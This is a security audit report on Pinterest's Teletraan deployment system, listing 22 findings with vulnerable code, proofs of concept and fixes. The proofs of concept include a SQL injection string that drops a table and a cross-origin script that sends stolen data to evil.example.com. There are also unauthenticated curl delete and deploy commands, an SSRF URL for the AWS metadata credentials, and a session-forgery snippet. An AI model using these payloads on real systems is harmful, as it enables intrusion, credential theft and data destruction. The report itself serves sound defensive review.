# Teletraan Security Audit Report

**Date:** 2026-02-21
**Scope:** Full codebase security review of Pinterest Teletraan deployment system
**Components:** deploy-service (Java/Dropwizard), deploy-board (Python/Django), deploy-agent (Python)

---

## Executive Summary

This report documents a comprehensive security audit of the Teletraan codebase. The audit identified **22 distinct vulnerabilities** across 6 severity categories. The most critical findings include SQL injection via unsafe query construction, a wildcard CORS policy with credentials, authentication/authorization bypass by default configuration, and Server-Side Request Forgery (SSRF) via unvalidated webhook URLs.

### Severity Summary

| Severity | Count | Description |
|----------|-------|-------------|
| **CRITICAL** | 4 | Exploitable with high impact, immediate remediation required |
| **HIGH** | 5 | Significant risk, remediation within days |
| **MEDIUM** | 7 | Moderate risk, remediation within weeks |
| **LOW** | 4 | Minor risk, remediation during normal development |
| **INFO** | 2 | Best-practice improvements |

---

## CRITICAL Findings

### C1: SQL Injection via Unsafe String Interpolation in `QueryUtils.genStringGroupClause`

**File:** `deploy-service/common/src/main/java/com/pinterest/deployservice/db/QueryUtils.java:22-31`
**CWE:** CWE-89 (SQL Injection)
**CVSS:** 9.8

**Description:**
The `genStringGroupClause()` method directly concatenates user-controllable string values into SQL `IN` clauses without parameterization or escaping. Values are wrapped in single quotes but never sanitized, enabling classic SQL injection via quote escaping.

**Vulnerable Code:**
```java
public static String genStringGroupClause(Collection<String> names) {
    StringBuilder sb = new StringBuilder();
    for (String name : names) {
        sb.append("'");
        sb.append(name);   // No escaping — direct concatenation
        sb.append("',");
    }
    if (sb.length() > 0) sb.setLength(sb.length() - 1);
    return sb.toString();
}
```

**Proof of Concept:**
If a caller passes a collection containing the value `test'); DROP TABLE deploys; --`, the resulting SQL fragment would be:
```sql
'test'); DROP TABLE deploys; --'
```
When embedded in a query like `SELECT * FROM hosts WHERE group_name IN (...)`, this breaks out of the string literal and allows arbitrary SQL execution.

**Call Sites:**
This method is called from multiple DAO implementations where collection values originate from API parameters:
- `DBAgentDAOImpl.java` — `getByHostId` with host IDs
- `DBHostDAOImpl.java` — group name queries
- `DBDeployDAOImpl.java` — via `genEnumGroupClause` (enum values are safe, but the pattern is dangerous)

**Note:** `genStringPlaceholderList()` at line 33 is the safe pattern already available in the codebase — it generates `?,?,?` placeholders. The unsafe `genStringGroupClause` should be replaced with this parameterized approach.

**Recommendation:**
Replace all usages of `genStringGroupClause` with parameterized queries using `genStringPlaceholderList`:
```java
// Before (UNSAFE):
String clause = QueryUtils.genStringGroupClause(names);
query(String.format("SELECT * FROM t WHERE col IN (%s)", clause));

// After (SAFE):
String placeholders = QueryUtils.genStringPlaceholderList(names.size());
query(String.format("SELECT * FROM t WHERE col IN (%s)", placeholders), names.toArray());
```

---

### C2: Wildcard CORS with Credentials Enabled

**File:** `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/TeletraanService.java:122-133`
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)
**CVSS:** 9.1

**Description:**
The Teletraan API service configures CORS to allow **all origins** (`*`) while simultaneously enabling `Access-Control-Allow-Credentials: true`. This combination allows any website to make authenticated cross-origin requests to the Teletraan API, stealing data or performing actions on behalf of authenticated users.

**Vulnerable Code:**
```java
System.setProperty("sun.net.http.allowRestrictedHeaders", "true");
FilterRegistration.Dynamic filter =
    environment.servlets().addFilter("CORS", CrossOriginFilter.class);
filter.addMappingForUrlPatterns(EnumSet.allOf(DispatcherType.class), true, "/*");
filter.setInitParameter(CrossOriginFilter.ALLOWED_METHODS_PARAM, "GET,PUT,POST,DELETE,OPTIONS");
filter.setInitParameter(CrossOriginFilter.ALLOWED_ORIGINS_PARAM, "*");           // ANY origin
filter.setInitParameter(CrossOriginFilter.ACCESS_CONTROL_ALLOW_CREDENTIALS_HEADER, "true"); // WITH credentials
```

**Proof of Concept:**
An attacker hosts the following on `https://evil.example.com`:
```html
<script>
fetch('https://teletraan.internal/v1/envs', {
  credentials: 'include'  // sends session cookies
})
.then(r => r.json())
.then(data => {
  // Exfiltrate all environment data
  fetch('https://evil.example.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```
A logged-in user visiting this page would have their Teletraan data exfiltrated. The attacker could also issue mutating requests (PUT/POST/DELETE) to modify deployments.

**Note:** Modern browsers block `Access-Control-Allow-Origin: *` combined with `credentials: include`, but Jetty's `CrossOriginFilter` reflects the `Origin` header as the `Access-Control-Allow-Origin` value when credentials are enabled, effectively bypassing this browser protection.

**Recommendation:**
Configure an explicit allowlist of trusted origins:
```java
filter.setInitParameter(CrossOriginFilter.ALLOWED_ORIGINS_PARAM,
    "https://deploy-board.internal,https://teletraan-ui.internal");
```

---

### C3: Authentication and Authorization Disabled by Default

**File:** `deploy-service/teletraanservice/bin/server.yaml:80-118`
**Related:** `deploy-service/universal/src/main/java/com/pinterest/teletraan/universal/security/AnonymousAuthFilter.java`, `deploy-service/universal/src/main/java/com/pinterest/teletraan/universal/security/OpenAuthorizer.java`
**CWE:** CWE-306 (Missing Authentication for Critical Function)
**CVSS:** 9.8

**Description:**
The default `server.yaml` ships with both authentication and authorization **commented out**. When unconfigured, the service uses `AnonymousAuthFilter` which grants every request the identity of an anonymous user with **all roles** (line 49: `isUserInRole` always returns `true`), and `OpenAuthorizer` which authorizes **every request** (line 30: `authorize` always returns `true`).

This means an unauthenticated, unauthorized user can:
- Create, modify, and delete deployments
- Modify environment configurations
- Access and modify webhook secrets
- Stop hosts and services

**Vulnerable Code (AnonymousAuthFilter.java:48-49):**
```java
@Override
public boolean isUserInRole(String s) {
    return true;  // Every role check passes
}
```

**Vulnerable Code (OpenAuthorizer.java:29-31):**
```java
public boolean authorize(...) {
    return true;  // Every authorization check passes
}
```

**Proof of Concept:**
With default configuration, any unauthenticated request succeeds:
```bash
# Delete an environment — no auth required
curl -X DELETE https://teletraan:8080/v1/envs/production/prod

# Create a deploy with arbitrary build
curl -X POST https://teletraan:8080/v1/envs/production/prod/deploys \
  -H 'Content-Type: application/json' \
  -d '{"buildId": "attacker-controlled-build-id"}'
```

**Recommendation:**
1. **Never ship with auth disabled by default.** Change the default configuration to require authentication.
2. Add a startup warning/failure when auth is not configured.
3. Move `AnonymousAuthFilter` and `OpenAuthorizer` to test scope only.

---

### C4: Server-Side Request Forgery (SSRF) via Webhook URLs

**File:** `deploy-service/common/src/main/java/com/pinterest/deployservice/handler/WebhookJob.java:50-106`
**CWE:** CWE-918 (Server-Side Request Forgery)
**CVSS:** 8.6

**Description:**
Webhook URLs are stored by users and executed server-side without any URL validation. An attacker with WRITE access can register webhooks pointing to internal services, cloud metadata endpoints, or other sensitive internal infrastructure.

**Vulnerable Code:**
```java
String url = webhook.getUrl();
url = url.replaceAll("\\$TELETRAAN_DEPLOY_ID", deployId)  // Only token replacement
         .replaceAll("\\$TELETRAAN_DEPLOY_START", deployStart)
         .replaceAll("\\$TELETRAAN_NUMERIC_DEPLOY_STATE", numericDeployState)
         .replaceAll("\\$TELETRAAN_DEPLOY_TYPE", deployType);

// No URL validation — directly issues HTTP request to arbitrary URL
if (method.equalsIgnoreCase("GET")) {
    httpClient.get(url, null, headers);
}
```

**Proof of Concept:**
An authorized user creates a webhook with the following URL:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
When any deploy state change triggers the webhook, the Teletraan server fetches AWS IAM credentials from the instance metadata service. The response is logged at INFO level (line 107), potentially exposing credentials in logs.

Other SSRF targets:
- `http://localhost:8081/` — Dropwizard admin port (health checks, thread dumps, metrics)
- `http://internal-db:3306/` — Internal database port scanning
- `file:///etc/passwd` — Local file access (depending on HTTP client)

**Recommendation:**
1. Implement a URL allowlist of permitted webhook domains
2. Block RFC 1918 private addresses, link-local addresses, and localhost
3. Block non-HTTP(S) schemes
4. Validate resolved IPs after DNS resolution (to prevent DNS rebinding)

```java
private static final Set<String> BLOCKED_HOSTS = Set.of("localhost", "127.0.0.1", "0.0.0.0", "169.254.169.254");

private boolean isUrlSafe(String url) {
    try {
        URL parsed = new URL(url);
        if (!parsed.getProtocol().matches("https?")) return false;
        InetAddress addr = InetAddress.getByName(parsed.getHost());
        return !addr.isLoopbackAddress() && !addr.isLinkLocalAddress()
            && !addr.isSiteLocalAddress() && !BLOCKED_HOSTS.contains(parsed.getHost());
    } catch (Exception e) { return false; }
}
```

---

## HIGH Findings

### H1: OAuth Token Passed as URL Query Parameter

**File:** `deploy-service/universal/src/main/java/com/pinterest/teletraan/universal/security/OAuthAuthenticator.java:47,121-123`
**CWE:** CWE-598 (Use of GET Request Method With Sensitive Query Strings)
**CVSS:** 7.5

**Description:**
The `OAuthAuthenticator` passes OAuth access tokens as URL query parameters rather than in the `Authorization` header. This causes tokens to be logged in web server access logs, proxy logs, browser history, and HTTP `Referer` headers.

**Vulnerable Code:**
```java
private static final String ACCESS_TOKEN_QUERY = "/?access_token=%s";

private static String getUriString(String token) {
    return String.format(ACCESS_TOKEN_QUERY, token);
}
```

**Recommendation:**
Pass the token in the `Authorization: Bearer` header:
```java
private String getData(HttpClient client, String token) {
    return client.headers(h -> h.add("Authorization", "Bearer " + token))
        .get()
        .uri("/")
        .responseContent()
        .aggregate()
        .asString()
        ...
}
```

---

### H2: Hardcoded Default Database Credentials

**Files:**
- `deploy-service/teletraanservice/bin/server.yaml:63-64`
- `deploy-service/common/src/main/java/com/pinterest/deployservice/common/KnoxDBKeyReader.java:26-27`
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**CVSS:** 7.2

**Description:**
The default configuration uses `root` with an empty password for the MySQL database. The `KnoxDBKeyReader` also hardcodes these same fallback credentials and silently falls back to them on any Knox failure.

**server.yaml:**
```yaml
db:
  userName: root
  password:
```

**KnoxDBKeyReader.java:**
```java
private static String testUserName = "root";
private static String testPassword = "";
```

If Knox initialization fails (network issue, misconfiguration), the system silently connects to the database as `root` with no password, potentially granting full database access.

**Recommendation:**
1. Remove hardcoded credentials from the default configuration
2. Fail loudly when Knox initialization fails in production
3. Use environment variables with no default for database credentials

---

### H3: Unsafe Reflection via `Class.forName()`

**Files:**
- `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/config/ExternalAlertsConfigFactory.java:42`
- `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/ConfigHelper.java:249`
**CWE:** CWE-470 (Use of Externally-Controlled Input in Reflection)
**CVSS:** 7.5

**Description:**
Configuration-driven `Class.forName()` calls allow arbitrary class instantiation. While the class names come from YAML configuration rather than direct user input, a configuration injection or supply-chain attack could exploit this to achieve remote code execution.

**Vulnerable Code (ExternalAlertsConfigFactory.java):**
```java
Class<?> factoryClass = Class.forName(factory);  // factory from YAML config
Constructor<?> ctor = factoryClass.getConstructor();
return (ExternalAlertFactory) ctor.newInstance();
```

**Proof of Concept:**
If an attacker can modify the `server.yaml` (via config injection, CI/CD compromise, or environment variable substitution abuse):
```yaml
externalAlerts:
  factory: com.sun.rowset.JdbcRowSetImpl  # JNDI injection gadget
```

**Recommendation:**
Maintain an explicit allowlist of permitted class names:
```java
private static final Set<String> ALLOWED_FACTORIES = Set.of(
    "com.pinterest.deployservice.alerts.PinterestExternalAlertFactory"
);

public ExternalAlertFactory createExternalAlertFactory() throws Exception {
    if (!ALLOWED_FACTORIES.contains(factory)) {
        throw new SecurityException("Unauthorized factory class: " + factory);
    }
    // ... proceed with instantiation
}
```

---

### H4: Django `SECRET_KEY` Defaults to `None`

**File:** `deploy-board/deploy_board/settings.py:50`
**CWE:** CWE-330 (Use of Insufficiently Random Values)
**CVSS:** 7.5

**Description:**
The Django `SECRET_KEY` defaults to `None` when the `SECRET_KEY` environment variable is unset:
```python
SECRET_KEY = os.getenv("SECRET_KEY", None)
```

Django uses this key for:
- Cryptographic signing of session cookies (`SESSION_ENGINE = "django.contrib.sessions.backends.signed_cookies"`)
- CSRF token generation
- Password reset tokens

With `None` as the key, session cookies are signed with a predictable value, allowing session forgery.

**Proof of Concept:**
An attacker knowing `SECRET_KEY` is `None` can forge signed session cookies:
```python
from django.core.signing import Signer
signer = Signer(key=None)
forged_session = signer.sign('{"username": "admin"}')
# Use forged_session as the session cookie value
```

**Recommendation:**
Fail at startup if `SECRET_KEY` is not set:
```python
SECRET_KEY = os.environ["SECRET_KEY"]  # Raises KeyError if missing
```

---

### H5: Debug Mode Enabled in Django Settings

**File:** `deploy-board/deploy_board/settings.py`
**CWE:** CWE-215 (Insertion of Sensitive Information Into Debugging Code)
**CVSS:** 5.3

**Description:**
The `DEBUG` setting defaults to `True` (or is left at Django's default). With debug mode enabled in production:
- Full stack traces with local variable values are shown to users
- SQL queries are logged in memory
- The Django debug toolbar may be exposed
- Detailed error pages reveal file paths, settings, and installed apps

**Recommendation:**
Ensure `DEBUG` defaults to `False`:
```python
DEBUG = os.getenv("DEBUG", "False").lower() == "true"
```

---

## MEDIUM Findings

### M1: Log Injection via Unsanitized User Input

**Files:**
- `deploy-service/common/src/main/java/com/pinterest/deployservice/handler/WebhookJob.java:56,67,78`
- Multiple resource classes logging operator names and bean `toString()` output
**CWE:** CWE-117 (Improper Output Neutralization for Logs)
**CVSS:** 5.3

**Description:**
User-controlled values (URLs, header strings, operator names) are logged without sanitization. An attacker can inject newlines and fake log entries.

**Vulnerable Code:**
```java
LOG.info("Url after transform is {}", url);           // url from user input
LOG.info("Header string after transform is {}", headerString); // headers from user input
```

**Proof of Concept:**
A webhook URL containing:
```
https://example.com\n2026-02-21 INFO [admin] Successfully deployed production build abc123
```
Would create a fake log entry that could mislead incident responders.

**Recommendation:**
Sanitize values before logging (strip newlines, limit length):
```java
private static String sanitizeForLog(String input) {
    if (input == null) return "null";
    return input.replaceAll("[\\r\\n]", "_").substring(0, Math.min(input.length(), 500));
}
```

---

### M2: Information Disclosure via Stack Traces in Error Responses

**Files:**
- `deploy-service/common/src/main/java/com/pinterest/deployservice/buildtags/BuildTagsManagerImpl.java:60`
- `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/resource/EnvAlerts.java:179`
- `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/worker/DeployTagWorker.java:191,199`
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
**CVSS:** 5.3

**Description:**
Full stack traces are logged via `ExceptionUtils.getStackTrace(ex)`, and exception details are returned in HTTP error responses. This leaks internal class names, file paths, database details, and library versions.

**Vulnerable Code:**
```java
LOG.error(ExceptionUtils.getStackTrace(ex));
throw new WebApplicationException(e.toString(), Response.Status.BAD_REQUEST);
```

**Recommendation:**
Log the full exception internally but return a generic error message to the user:
```java
LOG.error("Operation failed", ex);  // SLF4J logs full stack trace
throw new WebApplicationException("An internal error occurred", Response.Status.INTERNAL_SERVER_ERROR);
```

---

### M3: Missing Rate Limiting on Authentication Endpoints

**File:** `deploy-board/deploy_board/webapp/security.py` (OAuth flow)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**CVSS:** 5.3

**Description:**
The OAuth authentication flow has no rate limiting. An attacker could:
- Brute-force API tokens
- Perform credential stuffing attacks
- Exhaust OAuth provider rate limits (DoS)

**Recommendation:**
Add rate limiting middleware using Django's cache framework or a dedicated library:
```python
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='10/m', method='POST')
def login_view(request):
    ...
```

---

### M4: Webhook Execution Lacks Resource Limits

**File:** `deploy-service/common/src/main/java/com/pinterest/deployservice/handler/WebhookJob.java`
**CWE:** CWE-400 (Uncontrolled Resource Consumption)
**CVSS:** 5.3

**Description:**
Webhook execution has no limits on:
- Number of concurrent webhook calls
- Total number of webhooks per environment
- Response body size
- Number of redirects followed

A user could register hundreds of webhooks, each pointing to slow endpoints, exhausting the server's thread pool and memory on every deploy.

**Recommendation:**
1. Limit webhooks per environment (e.g., max 10)
2. Use a bounded thread pool for webhook execution
3. Set per-request timeouts and response size limits
4. Limit redirect following to 3 hops

---

### M5: Insecure Cookie Configuration in Django

**File:** `deploy-board/deploy_board/settings.py`
**CWE:** CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute)
**CVSS:** 5.4

**Description:**
The Django session configuration uses signed cookies (`SESSION_ENGINE = "django.contrib.sessions.backends.signed_cookies"`) but does not set critical cookie security flags:
- `SESSION_COOKIE_SECURE` is not set (cookies sent over HTTP)
- `SESSION_COOKIE_HTTPONLY` is not explicitly set
- `CSRF_COOKIE_SECURE` is not set

**Recommendation:**
```python
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Lax'
```

---

### M6: Dropwizard Admin Port Exposed Without Authentication

**File:** `deploy-service/teletraanservice/bin/server.yaml:10-12`
**CWE:** CWE-749 (Exposed Dangerous Method or Function)
**CVSS:** 5.3

**Description:**
The Dropwizard admin connector is bound to port 8081 with no authentication:
```yaml
adminConnectors:
  - type: http
    port: 8081
```

The admin port exposes:
- `/healthcheck` — health status
- `/metrics` — application metrics (may reveal internal data)
- `/threads` — thread dump (reveals internal state)
- `/tasks/gc` — trigger garbage collection (DoS)

**Recommendation:**
Bind the admin port to localhost only, or add authentication:
```yaml
adminConnectors:
  - type: http
    port: 8081
    bindHost: 127.0.0.1
```

---

### M7: Environment Variable Substitution in Configuration

**File:** `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/TeletraanService.java:45-48`
**CWE:** CWE-15 (External Control of System or Configuration Setting)
**CVSS:** 5.0

**Description:**
The service enables environment variable substitution in the YAML configuration with `strict: false`, meaning undefined variables silently resolve to empty strings:
```java
new EnvironmentVariableSubstitutor(false)  // false = non-strict
```

This can lead to:
- Silently empty database passwords
- Missing authentication configuration (falling back to anonymous)
- Empty webhook URLs or API keys

**Recommendation:**
Enable strict mode so missing variables cause startup failure:
```java
new EnvironmentVariableSubstitutor(true)  // true = strict, fail on undefined vars
```

---

## LOW Findings

### L1: Use of Deprecated `commons-dbcp` 1.x Connection Pool

**File:** `deploy-service/common/pom.xml`
**CWE:** CWE-1104 (Use of Unmaintained Third Party Components)

**Description:**
The codebase uses `org.apache.commons.dbcp.BasicDataSource` (commons-dbcp 1.x), which is end-of-life and has known issues with connection leak handling and thread safety.

**Recommendation:**
Migrate to `commons-dbcp2` (`org.apache.commons.dbcp2.BasicDataSource`) or HikariCP.

---

### L2: Potential ReDoS in Deploy Agent Template Transformer

**File:** `deploy-agent/deployd/staging/transformer.py:60`
**CWE:** CWE-1333 (Inefficient Regular Expression Complexity)

**Description:**
```python
matcher = "(\{\$|\$\{)TELETRAAN_(?P<KEY>[a-zA-Z0-9\-_]+)(?P<COLON>:)?(?P<VALUE>.*?)\}"
```
The `.*?` group could cause excessive backtracking with crafted input. Risk is low since this processes deployment configuration templates, not direct user input.

**Recommendation:**
Replace `.*?` with a more specific pattern: `[^}]*`

---

### L3: Token Expiry Set to 180 Days

**File:** `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/resource/TokenRoles.java:33,75`
**CWE:** CWE-613 (Insufficient Session Expiration)

**Description:**
Script tokens are valid for 180 days:
```java
public static final long VALIDATE_TIME = 180;
bean.setExpire_date(Instant.now().plus(VALIDATE_TIME, ChronoUnit.DAYS).toEpochMilli());
```

Long-lived tokens increase the window for token theft and abuse.

**Recommendation:**
Reduce token lifetime to 30 days and implement token rotation.

---

### L4: `sun.net.http.allowRestrictedHeaders` Set Globally

**File:** `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/TeletraanService.java:122`

**Description:**
```java
System.setProperty("sun.net.http.allowRestrictedHeaders", "true");
```
This JVM-wide setting allows setting restricted HTTP headers (like `Host`, `Content-Length`) in all HTTP connections made by the JVM, not just the CORS filter. This could facilitate request smuggling in other HTTP client code.

**Recommendation:**
Remove this system property. It should not be needed for CORS filter configuration.

---

## INFO Findings

### I1: HTTP Used for Service Connectors (No TLS)

**File:** `deploy-service/teletraanservice/bin/server.yaml:8-9`

**Description:**
Both application and admin connectors use plain HTTP. If TLS termination is not handled by a reverse proxy, all traffic (including auth tokens and deployment data) is transmitted in cleartext.

**Recommendation:**
Ensure TLS is terminated by a reverse proxy, or configure HTTPS connectors in Dropwizard.

---

### I2: Verbose Logging of Sensitive Data

**Files:**
- `deploy-service/common/src/main/java/com/pinterest/deployservice/handler/WebhookJob.java:67` — logs webhook header values
- `deploy-service/teletraanservice/src/main/java/com/pinterest/teletraan/resource/Hosts.java:78` — logs full `HostBean.toString()`

**Description:**
Webhook headers (which may contain API keys/tokens) and full bean objects (which may contain sensitive fields) are logged at INFO level.

**Recommendation:**
Redact sensitive fields before logging. Never log authentication headers or tokens.

---

## Remediation Priority

### Immediate (Sprint 0)
1. **C2:** Fix CORS configuration — restrict allowed origins
2. **C3:** Enable authentication and authorization by default
3. **H4:** Fail on missing Django `SECRET_KEY`

### Short-term (1-2 Sprints)
4. **C1:** Replace `genStringGroupClause` with parameterized queries
5. **C4:** Implement SSRF protection for webhook URLs
6. **H1:** Move OAuth token to Authorization header
7. **H2:** Remove hardcoded database credentials

### Medium-term (3-4 Sprints)
8. **M1-M2:** Sanitize log output and error responses
9. **M4:** Add webhook execution resource limits
10. **M5-M6:** Harden cookie and admin port configuration
11. **H3:** Add class name allowlist for reflection

### Long-term
12. **L1:** Migrate to modern connection pool
13. **L3:** Reduce token lifetime
14. All remaining LOW and INFO findings

---

## Methodology

This audit was conducted through static analysis of the complete Teletraan codebase, including:
- Manual code review of all Java resource classes, DAO implementations, security filters, and configuration
- Review of Python Django views, settings, and deployment agent code
- Analysis of dependency versions and known CVEs
- Configuration review of default YAML settings
- Data flow analysis from API endpoints through to database queries
- Authentication and authorization flow analysis

Tools and techniques used:
- Source code pattern matching for common vulnerability signatures
- Call graph analysis for tainted data flow
- Configuration audit against CIS benchmarks and OWASP guidelines
